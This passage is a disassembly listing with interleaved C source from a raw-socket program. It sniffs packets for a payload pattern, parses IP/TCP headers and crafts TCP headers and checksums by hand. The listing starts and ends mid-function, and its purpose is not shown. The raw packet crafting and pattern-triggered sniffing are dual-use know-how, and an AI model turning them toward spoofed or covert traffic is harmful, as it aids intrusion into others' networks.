  402409:	ff 75 d0             	push   -0x30(%rbp)
  40240c:	ff 75 c8             	push   -0x38(%rbp)
  40240f:	ff 75 c0             	push   -0x40(%rbp)
  402412:	48 89 c7             	mov    %rax,%rdi
  402415:	e8 e2 fa ff ff       	call   401efc <build_null_packet>
  40241a:	48 83 c4 30          	add    $0x30,%rsp
  40241e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  402425:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40242c:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  402430:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402434:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40243b:	48 8b 95 78 ff ff ff 	mov    -0x88(%rbp),%rdx
  402442:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  402446:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  40244a:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40244e:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
            return packet;
  402452:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402456:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  40245a:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  40245e:	48 89 08             	mov    %rcx,(%rax)
  402461:	48 89 58 08          	mov    %rbx,0x8(%rax)
  402465:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  402469:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  40246d:	48 89 48 10          	mov    %rcx,0x10(%rax)
  402471:	48 89 58 18          	mov    %rbx,0x18(%rax)
  402475:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402479:	48 89 50 20          	mov    %rdx,0x20(%rax)
  40247d:	e9 b9 00 00 00       	jmp    40253b <rawsocket_sniff_pattern+0x24d>
        }

        packet = parse_packet(buffer, buffer_size);
  402482:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  402489:	8b 55 b0             	mov    -0x50(%rbp),%edx
  40248c:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
  402490:	48 89 ce             	mov    %rcx,%rsi
  402493:	48 89 c7             	mov    %rax,%rdi
  402496:	e8 02 01 00 00       	call   40259d <parse_packet>
  40249b:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4024a2:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4024a9:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4024ad:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  4024b1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4024b8:	48 8b 95 78 ff ff ff 	mov    -0x88(%rbp),%rdx
  4024bf:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4024c3:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  4024c7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4024cb:	48 89 45 e0          	mov    %rax,-0x20(%rbp)

        if(strncmp(packet.payload, payload_pattern, strlen(payload_pattern)) == 0){
  4024cf:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4024d3:	48 89 c7             	mov    %rax,%rdi
  4024d6:	e8 d5 eb ff ff       	call   4010b0 <strlen@plt>
  4024db:	48 89 c2             	mov    %rax,%rdx
  4024de:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4024e2:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
  4024e6:	48 89 ce             	mov    %rcx,%rsi
  4024e9:	48 89 c7             	mov    %rax,%rdi
  4024ec:	e8 6f eb ff ff       	call   401060 <strncmp@plt>
  4024f1:	85 c0                	test   %eax,%eax
  4024f3:	75 07                	jne    4024fc <rawsocket_sniff_pattern+0x20e>
            //printf("Found the packet with the pattern %s\n", payload_pattern);
            pattern_received = 1;
  4024f5:	c7 45 a8 01 00 00 00 	movl   $0x1,-0x58(%rbp)
    while(!pattern_received){
  4024fc:	83 7d a8 00          	cmpl   $0x0,-0x58(%rbp)
  402500:	0f 84 32 fe ff ff    	je     402338 <rawsocket_sniff_pattern+0x4a>
            //Not the one we are looking for
            //printf("Found payload string was %s\n", packet.payload);
        }

    }
    close(sock);
  402506:	8b 45 ac             	mov    -0x54(%rbp),%eax
  402509:	89 c7                	mov    %eax,%edi
  40250b:	e8 40 ec ff ff       	call   401150 <close@plt>
    return packet;
  402510:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402514:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  402518:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  40251c:	48 89 08             	mov    %rcx,(%rax)
  40251f:	48 89 58 08          	mov    %rbx,0x8(%rax)
  402523:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  402527:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  40252b:	48 89 48 10          	mov    %rcx,0x10(%rax)
  40252f:	48 89 58 18          	mov    %rbx,0x18(%rax)
  402533:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402537:	48 89 50 20          	mov    %rdx,0x20(%rax)
}
  40253b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40253f:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
  402546:	00 00 
  402548:	74 05                	je     40254f <rawsocket_sniff_pattern+0x261>
  40254a:	e8 71 eb ff ff       	call   4010c0 <__stack_chk_fail@plt>
  40254f:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402553:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  402557:	c9                   	leave  
  402558:	c3                   	ret    

0000000000402559 <get_packet_proto>:

/**
 * Function to get protocol of packet
 * 
 */ 
int get_packet_proto(char* buffer, int size){
  402559:	f3 0f 1e fa          	endbr64 
  40255d:	55                   	push   %rbp
  40255e:	48 89 e5             	mov    %rsp,%rbp
  402561:	48 83 ec 20          	sub    $0x20,%rsp
  402565:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402569:	89 75 e4             	mov    %esi,-0x1c(%rbp)
    struct iphdr *ipheader = (struct iphdr*)buffer;
  40256c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402570:	48 89 45 f8          	mov    %rax,-0x8(%rbp)

    int protocol = ipheader->protocol;
  402574:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402578:	0f b6 40 09          	movzbl 0x9(%rax),%eax
  40257c:	0f b6 c0             	movzbl %al,%eax
  40257f:	89 45 f4             	mov    %eax,-0xc(%rbp)

    printf("Packet of protocol %i detected\n", protocol);
  402582:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402585:	89 c6                	mov    %eax,%esi
  402587:	48 8d 3d 52 0d 00 00 	lea    0xd52(%rip),%rdi        # 4032e0 <_IO_stdin_used+0x2e0>
  40258e:	b8 00 00 00 00       	mov    $0x0,%eax
  402593:	e8 58 eb ff ff       	call   4010f0 <printf@plt>
    return protocol;
  402598:	8b 45 f4             	mov    -0xc(%rbp),%eax
}
  40259b:	c9                   	leave  
  40259c:	c3                   	ret    

000000000040259d <parse_packet>:
 * Obtain packet from byte stream
 * 
 * NOTE: only accepts TCP packets for now
 * 
 */ 
packet_t parse_packet(char* buffer, int size){
  40259d:	f3 0f 1e fa          	endbr64 
  4025a1:	55                   	push   %rbp
  4025a2:	48 89 e5             	mov    %rsp,%rbp
  4025a5:	53                   	push   %rbx
  4025a6:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  4025ad:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
  4025b1:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  4025b5:	89 55 9c             	mov    %edx,-0x64(%rbp)
  4025b8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4025bf:	00 00 
  4025c1:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4025c5:	31 c0                	xor    %eax,%eax
    int proto = get_packet_proto(buffer, size);
  4025c7:	8b 55 9c             	mov    -0x64(%rbp),%edx
  4025ca:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4025ce:	89 d6                	mov    %edx,%esi
  4025d0:	48 89 c7             	mov    %rax,%rdi
  4025d3:	e8 81 ff ff ff       	call   402559 <get_packet_proto>
  4025d8:	89 45 b4             	mov    %eax,-0x4c(%rbp)
    packet_t packet;

    if(proto!=6){
  4025db:	83 7d b4 06          	cmpl   $0x6,-0x4c(%rbp)
  4025df:	74 74                	je     402655 <parse_packet+0xb8>
        build_null_packet(packet);
  4025e1:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  4025e8:	48 83 ec 08          	sub    $0x8,%rsp
  4025ec:	ff 75 e0             	push   -0x20(%rbp)
  4025ef:	ff 75 d8             	push   -0x28(%rbp)
  4025f2:	ff 75 d0             	push   -0x30(%rbp)
  4025f5:	ff 75 c8             	push   -0x38(%rbp)
  4025f8:	ff 75 c0             	push   -0x40(%rbp)
  4025fb:	48 89 c7             	mov    %rax,%rdi
  4025fe:	e8 f9 f8 ff ff       	call   401efc <build_null_packet>
  402603:	48 83 c4 30          	add    $0x30,%rsp
        fprintf(stderr, "Parsed packet of non-supported protocol. This should not have happened %i\n", proto);
  402607:	48 8b 05 52 2b 00 00 	mov    0x2b52(%rip),%rax        # 405160 <stderr@@GLIBC_2.2.5>
  40260e:	8b 55 b4             	mov    -0x4c(%rbp),%edx
  402611:	48 8d 35 e8 0c 00 00 	lea    0xce8(%rip),%rsi        # 403300 <_IO_stdin_used+0x300>
  402618:	48 89 c7             	mov    %rax,%rdi
  40261b:	b8 00 00 00 00       	mov    $0x0,%eax
  402620:	e8 8b eb ff ff       	call   4011b0 <fprintf@plt>
        return packet;
  402625:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  402629:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  40262d:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  402631:	48 89 08             	mov    %rcx,(%rax)
  402634:	48 89 58 08          	mov    %rbx,0x8(%rax)
  402638:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  40263c:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  402640:	48 89 48 10          	mov    %rcx,0x10(%rax)
  402644:	48 89 58 18          	mov    %rbx,0x18(%rax)
  402648:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  40264c:	48 89 50 20          	mov    %rdx,0x20(%rax)
  402650:	e9 98 00 00 00       	jmp    4026ed <parse_packet+0x150>
    }

    //Constructing packet struct
    packet.ipheader = (struct iphdr*) buffer;
  402655:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  402659:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    int ip_header_length = packet.ipheader->ihl*4;
  40265d:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  402661:	0f b6 00             	movzbl (%rax),%eax
  402664:	83 e0 0f             	and    $0xf,%eax
  402667:	0f b6 c0             	movzbl %al,%eax
  40266a:	c1 e0 02             	shl    $0x2,%eax
  40266d:	89 45 b8             	mov    %eax,-0x48(%rbp)

    packet.tcpheader = (struct tcphdr*) (buffer+ip_header_length);
  402670:	8b 45 b8             	mov    -0x48(%rbp),%eax
  402673:	48 63 d0             	movslq %eax,%rdx
  402676:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  40267a:	48 01 d0             	add    %rdx,%rax
  40267d:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    int tcp_header_length = packet.tcpheader->doff*4;
  402681:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  402685:	0f b6 40 0c          	movzbl 0xc(%rax),%eax
  402689:	c0 e8 04             	shr    $0x4,%al
  40268c:	0f b6 c0             	movzbl %al,%eax
  40268f:	c1 e0 02             	shl    $0x2,%eax
  402692:	89 45 bc             	mov    %eax,-0x44(%rbp)

    packet.payload = (char*) buffer+ip_header_length+tcp_header_length;
  402695:	8b 45 b8             	mov    -0x48(%rbp),%eax
  402698:	48 63 d0             	movslq %eax,%rdx
  40269b:	8b 45 bc             	mov    -0x44(%rbp),%eax
  40269e:	48 98                	cltq   
  4026a0:	48 01 c2             	add    %rax,%rdx
  4026a3:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4026a7:	48 01 d0             	add    %rdx,%rax
  4026aa:	48 89 45 d0          	mov    %rax,-0x30(%rbp)

    packet.payload_length = size - ip_header_length - tcp_header_length;
  4026ae:	8b 45 9c             	mov    -0x64(%rbp),%eax
  4026b1:	2b 45 b8             	sub    -0x48(%rbp),%eax
  4026b4:	2b 45 bc             	sub    -0x44(%rbp),%eax
  4026b7:	89 45 d8             	mov    %eax,-0x28(%rbp)

    packet.packet = buffer;
  4026ba:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4026be:	48 89 45 e0          	mov    %rax,-0x20(%rbp)

    return packet;
  4026c2:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4026c6:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  4026ca:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  4026ce:	48 89 08             	mov    %rcx,(%rax)
  4026d1:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4026d5:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  4026d9:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  4026dd:	48 89 48 10          	mov    %rcx,0x10(%rax)
  4026e1:	48 89 58 18          	mov    %rbx,0x18(%rax)
  4026e5:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  4026e9:	48 89 50 20          	mov    %rdx,0x20(%rax)
  4026ed:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4026f1:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
  4026f8:	00 00 
  4026fa:	74 05                	je     402701 <parse_packet+0x164>
  4026fc:	e8 bf e9 ff ff       	call   4010c0 <__stack_chk_fail@plt>
  402701:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  402705:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  402709:	c9                   	leave  
  40270a:	c3                   	ret    

000000000040270b <generate_tcp_header>:
    u_int16_t source, //source port
    u_int16_t destination, //destination port
    u_int32_t seq_num, //sequence number
    u_int32_t ack_num, //acknowledgment number
    u_int16_t window //congestion window size
    ){
  40270b:	f3 0f 1e fa          	endbr64 
  40270f:	55                   	push   %rbp
  402710:	48 89 e5             	mov    %rsp,%rbp
  402713:	48 83 ec 30          	sub    $0x30,%rsp
  402717:	89 f0                	mov    %esi,%eax
  402719:	89 55 e4             	mov    %edx,-0x1c(%rbp)
  40271c:	89 4d e0             	mov    %ecx,-0x20(%rbp)
  40271f:	44 89 c2             	mov    %r8d,%edx
  402722:	89 f9                	mov    %edi,%ecx
  402724:	66 89 4d ec          	mov    %cx,-0x14(%rbp)
  402728:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
  40272c:	89 d0                	mov    %edx,%eax
  40272e:	66 89 45 dc          	mov    %ax,-0x24(%rbp)
        struct tcphdr *tcpheader = malloc(sizeof(struct tcphdr));
  402732:	bf 14 00 00 00       	mov    $0x14,%edi
  402737:	e8 b4 ea ff ff       	call   4011f0 <malloc@plt>
  40273c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
        bzero(tcpheader, sizeof(struct tcphdr));
  402740:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402744:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40274b:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  402752:	00 
  402753:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%rax)
        //Set the tcp header with the parameters and all flags to 0 for now.
        //Also checksum is generated later
        tcpheader->ack = 0; //ACK flag
  40275a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40275e:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402762:	83 e2 ef             	and    $0xffffffef,%edx
  402765:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->ack_seq = ack_num;   //ACK sequence number
  402768:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40276c:	8b 55 e0             	mov    -0x20(%rbp),%edx
  40276f:	89 50 08             	mov    %edx,0x8(%rax)
        tcpheader->check = 0; //Checksum 0, set later
  402772:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402776:	66 c7 40 10 00 00    	movw   $0x0,0x10(%rax)
        tcpheader->dest = htons(destination); //Dest port
  40277c:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
  402780:	89 c7                	mov    %eax,%edi
  402782:	e8 59 e9 ff ff       	call   4010e0 <htons@plt>
  402787:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  40278b:	66 89 42 02          	mov    %ax,0x2(%rdx)
        tcpheader->doff = 5; //5 bytes, no options
  40278f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402793:	0f b6 50 0c          	movzbl 0xc(%rax),%edx
  402797:	83 e2 0f             	and    $0xf,%edx
  40279a:	83 ca 50             	or     $0x50,%edx
  40279d:	88 50 0c             	mov    %dl,0xc(%rax)
        tcpheader->fin = 0; //FIN flag
  4027a0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027a4:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  4027a8:	83 e2 fe             	and    $0xfffffffe,%edx
  4027ab:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->psh = 0; //PSH flag
  4027ae:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027b2:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  4027b6:	83 e2 f7             	and    $0xfffffff7,%edx
  4027b9:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->rst = 0; //RST flag
  4027bc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027c0:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  4027c4:	83 e2 fb             	and    $0xfffffffb,%edx
  4027c7:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->seq = seq_num; //Sequence number
  4027ca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027ce:	8b 55 e4             	mov    -0x1c(%rbp),%edx
  4027d1:	89 50 04             	mov    %edx,0x4(%rax)
        tcpheader->source = htons(source); //Source port
  4027d4:	0f b7 45 ec          	movzwl -0x14(%rbp),%eax
  4027d8:	89 c7                	mov    %eax,%edi
  4027da:	e8 01 e9 ff ff       	call   4010e0 <htons@plt>
  4027df:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4027e3:	66 89 02             	mov    %ax,(%rdx)
        tcpheader->syn = 0; //SYN flag
  4027e6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027ea:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  4027ee:	83 e2 fd             	and    $0xfffffffd,%edx
  4027f1:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->urg = 0; //URG flag
  4027f4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4027f8:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  4027fc:	83 e2 df             	and    $0xffffffdf,%edx
  4027ff:	88 50 0d             	mov    %dl,0xd(%rax)
        tcpheader->urg_ptr = 0; //URG pointer
  402802:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402806:	66 c7 40 12 00 00    	movw   $0x0,0x12(%rax)
        tcpheader->window = window; //window size
  40280c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402810:	0f b7 55 dc          	movzwl -0x24(%rbp),%edx
  402814:	66 89 50 0e          	mov    %dx,0xe(%rax)
        

        return tcpheader;
  402818:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    }
  40281c:	c9                   	leave  
  40281d:	c3                   	ret    

000000000040281e <generatePseudoHeader>:
 */
struct pseudo_header* generatePseudoHeader(
    u_int16_t payload_length,
    const char *source_address,
    const char *dest_address
    ){
  40281e:	f3 0f 1e fa          	endbr64 
  402822:	55                   	push   %rbp
  402823:	48 89 e5             	mov    %rsp,%rbp
  402826:	48 83 ec 30          	sub    $0x30,%rsp
  40282a:	89 f8                	mov    %edi,%eax
  40282c:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  402830:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  402834:	66 89 45 ec          	mov    %ax,-0x14(%rbp)
        struct pseudo_header *psh = malloc(sizeof(struct pseudo_header));
  402838:	bf 0c 00 00 00       	mov    $0xc,%edi
  40283d:	e8 ae e9 ff ff       	call   4011f0 <malloc@plt>
  402842:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
        bzero(psh, sizeof(struct pseudo_header));
  402846:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40284a:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  402851:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%rax)
        inet_pton(AF_INET, dest_address, (void*)&(psh->dest_address));
  402858:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40285c:	48 8d 50 04          	lea    0x4(%rax),%rdx
  402860:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402864:	48 89 c6             	mov    %rax,%rsi
  402867:	bf 02 00 00 00       	mov    $0x2,%edi
  40286c:	e8 5f e9 ff ff       	call   4011d0 <inet_pton@plt>
        psh->protocol_type = IPPROTO_TCP;
  402871:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402875:	c6 40 09 06          	movb   $0x6,0x9(%rax)
        psh->reserved = 0;
  402879:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40287d:	c6 40 08 00          	movb   $0x0,0x8(%rax)
        psh->segment_length = htons(payload_length+sizeof(struct tcphdr));
  402881:	0f b7 45 ec          	movzwl -0x14(%rbp),%eax
  402885:	83 c0 14             	add    $0x14,%eax
  402888:	0f b7 c0             	movzwl %ax,%eax
  40288b:	89 c7                	mov    %eax,%edi
  40288d:	e8 4e e8 ff ff       	call   4010e0 <htons@plt>
  402892:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  402896:	66 89 42 0a          	mov    %ax,0xa(%rdx)
        inet_pton(AF_INET, source_address, (void*)&(psh->source_address));
  40289a:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  40289e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4028a2:	48 89 c6             	mov    %rax,%rsi
  4028a5:	bf 02 00 00 00       	mov    $0x2,%edi
  4028aa:	e8 21 e9 ff ff       	call   4011d0 <inet_pton@plt>

        return psh;    
  4028af:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
}
  4028b3:	c9                   	leave  
  4028b4:	c3                   	ret    

00000000004028b5 <tcp_checksum>:
/**
 * TCP checksum calculation.
 * Following RFC 1071.
 * In essence 1's complement of 16-bit groups.
 */ 
unsigned short tcp_checksum(unsigned short *addr, int nbytes){
  4028b5:	f3 0f 1e fa          	endbr64 
  4028b9:	55                   	push   %rbp
  4028ba:	48 89 e5             	mov    %rsp,%rbp
  4028bd:	48 83 ec 20          	sub    $0x20,%rsp
  4028c1:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  4028c5:	89 75 e4             	mov    %esi,-0x1c(%rbp)
    long sum = 0;
  4028c8:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  4028cf:	00 
    unsigned short checksum;
    while(nbytes>1){
  4028d0:	eb 1a                	jmp    4028ec <tcp_checksum+0x37>
        sum += (unsigned short) *addr++;
  4028d2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4028d6:	48 8d 50 02          	lea    0x2(%rax),%rdx
  4028da:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
  4028de:	0f b7 00             	movzwl (%rax),%eax
  4028e1:	0f b7 c0             	movzwl %ax,%eax
  4028e4:	48 01 45 f8          	add    %rax,-0x8(%rbp)
        nbytes -= 2;
  4028e8:	83 6d e4 02          	subl   $0x2,-0x1c(%rbp)
    while(nbytes>1){
  4028ec:	83 7d e4 01          	cmpl   $0x1,-0x1c(%rbp)
  4028f0:	7f e0                	jg     4028d2 <tcp_checksum+0x1d>
    }
    if(nbytes>0){
  4028f2:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
  4028f6:	7e 30                	jle    402928 <tcp_checksum+0x73>
        sum += htons((unsigned char)*addr);
  4028f8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4028fc:	0f b7 00             	movzwl (%rax),%eax
  4028ff:	0f b6 c0             	movzbl %al,%eax
  402902:	89 c7                	mov    %eax,%edi
  402904:	e8 d7 e7 ff ff       	call   4010e0 <htons@plt>
  402909:	0f b7 c0             	movzwl %ax,%eax
  40290c:	48 01 45 f8          	add    %rax,-0x8(%rbp)
    }
            
    while (sum>>16){
  402910:	eb 16                	jmp    402928 <tcp_checksum+0x73>
        sum = (sum & 0xffff) + (sum >> 16);
  402912:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402916:	0f b7 d0             	movzwl %ax,%edx
  402919:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40291d:	48 c1 f8 10          	sar    $0x10,%rax
  402921:	48 01 d0             	add    %rdx,%rax
  402924:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    while (sum>>16){
  402928:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40292c:	48 c1 f8 10          	sar    $0x10,%rax
  402930:	48 85 c0             	test   %rax,%rax
  402933:	75 dd                	jne    402912 <tcp_checksum+0x5d>
    }

    checksum = ~sum;
  402935:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402939:	f7 d0                	not    %eax
  40293b:	66 89 45 f6          	mov    %ax,-0xa(%rbp)
    return checksum;
  40293f:	0f b7 45 f6          	movzwl -0xa(%rbp),%eax
}
  402943:	c9                   	leave  
  402944:	c3                   	ret    

0000000000402945 <compute_segment_checksum>:


void compute_segment_checksum(struct tcphdr *tcpheader, unsigned short *addr, int nbytes){
  402945:	f3 0f 1e fa          	endbr64 
  402949:	55                   	push   %rbp
  40294a:	48 89 e5             	mov    %rsp,%rbp
  40294d:	48 83 ec 30          	sub    $0x30,%rsp
  402951:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402955:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  402959:	89 55 dc             	mov    %edx,-0x24(%rbp)
    u_int16_t res =tcp_checksum(addr, nbytes);
  40295c:	8b 55 dc             	mov    -0x24(%rbp),%edx
  40295f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402963:	89 d6                	mov    %edx,%esi
  402965:	48 89 c7             	mov    %rax,%rdi
  402968:	e8 48 ff ff ff       	call   4028b5 <tcp_checksum>
  40296d:	66 89 45 fe          	mov    %ax,-0x2(%rbp)
    tcpheader->check = res;
  402971:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402975:	0f b7 55 fe          	movzwl -0x2(%rbp),%edx
  402979:	66 89 50 10          	mov    %dx,0x10(%rax)
}
  40297d:	90                   	nop
  40297e:	c9                   	leave  
  40297f:	c3                   	ret    

0000000000402980 <set_segment_flags>:

void set_segment_flags(struct tcphdr *tcphdr, int flags){
  402980:	f3 0f 1e fa          	endbr64 
  402984:	55                   	push   %rbp
  402985:	48 89 e5             	mov    %rsp,%rbp
  402988:	48 83 ec 30          	sub    $0x30,%rsp
  40298c:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  402990:	89 75 d4             	mov    %esi,-0x2c(%rbp)
    int iterator = 1;
  402993:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
    int *result = malloc(sizeof(int)*8);
  40299a:	bf 20 00 00 00       	mov    $0x20,%edi
  40299f:	e8 4c e8 ff ff       	call   4011f0 <malloc@plt>
  4029a4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    int counter = 0;
  4029a8:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
    while (iterator <= flags) {
  4029af:	eb 2a                	jmp    4029db <set_segment_flags+0x5b>
        if (iterator & flags){
  4029b1:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4029b4:	23 45 d4             	and    -0x2c(%rbp),%eax
  4029b7:	85 c0                	test   %eax,%eax
  4029b9:	74 19                	je     4029d4 <set_segment_flags+0x54>
            result[counter] = iterator;
  4029bb:	8b 45 f0             	mov    -0x10(%rbp),%eax
  4029be:	48 98                	cltq   
  4029c0:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  4029c7:	00 
  4029c8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4029cc:	48 01 c2             	add    %rax,%rdx
  4029cf:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4029d2:	89 02                	mov    %eax,(%rdx)
            
        } 
        counter++;
  4029d4:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
        iterator <<= 1;
  4029d8:	d1 65 ec             	shll   -0x14(%rbp)
    while (iterator <= flags) {
  4029db:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4029de:	3b 45 d4             	cmp    -0x2c(%rbp),%eax
  4029e1:	7e ce                	jle    4029b1 <set_segment_flags+0x31>
    }
    
    
    for(int ii=0; ii<8; ii++){
  4029e3:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  4029ea:	e9 54 01 00 00       	jmp    402b43 <set_segment_flags+0x1c3>
        if((result[ii] - CWR) == 0) tcphdr->res1 = 1;
  4029ef:	8b 45 f4             	mov    -0xc(%rbp),%eax
  4029f2:	48 98                	cltq   
  4029f4:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  4029fb:	00 
  4029fc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402a00:	48 01 d0             	add    %rdx,%rax
  402a03:	8b 00                	mov    (%rax),%eax
